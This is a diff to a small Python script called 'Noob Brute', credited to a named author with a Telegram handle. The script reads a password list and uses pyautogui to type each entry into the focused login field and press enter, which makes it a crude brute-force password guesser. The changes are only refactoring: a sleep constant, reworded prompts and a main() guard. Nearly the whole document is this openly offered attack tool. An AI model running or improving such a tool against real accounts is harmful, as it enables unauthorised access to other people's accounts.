@@ -2,6 +2,8 @@ import pyautogui
 import time
 from rich import print as pr
 
+SLEEP_TIME = 1
+
 pr("""[magenta]
 
 ███╗░░██╗░█████╗░░█████╗░██████╗░  ██████╗░██████╗░██╗░░░██╗████████╗███████╗
@@ -11,21 +13,24 @@ pr("""[magenta]
 ██║░╚███║╚█████╔╝╚█████╔╝██████╦╝  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗
 ╚═╝░░╚══╝░╚════╝░░╚════╝░╚═════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝[/magenta]""")
 print("\n")
-pr("[red]""made by : salehBNG\ntelegram : @SalehBNG0 \n -----------------------""[/red]")
+pr("[red]""Made by : salehBNG\nTelegram : @SalehBNG0 \n -----------------------""[/red]")
 print("\n")
-passwords = open(input("enter your password list : "))
+passwords = open(input("Enter your password list (File name): "))
 
 def write_and_clear(password):
     pyautogui.typewrite(password)
-    time.sleep(1)
+    time.sleep(SLEEP_TIME)
     pyautogui.press("backspace", presses=len(password))
+    time.sleep(SLEEP_TIME)
 
-    time.sleep(1)
 def write_passwords_and_enter():
     for password in passwords:
     	write_and_clear(password)
     	pyautogui.press("enter")
+def main():
+    write_passwords_and_enter()
+    pr("[green]""Noob Brute Ran Succesfully""[/green]")
 
-
-write_passwords_and_enter()
-pr("[green]""the end password list""[/green]")
+# Used to prevent running from imports
+if __name__ == "__main__":
+    main()
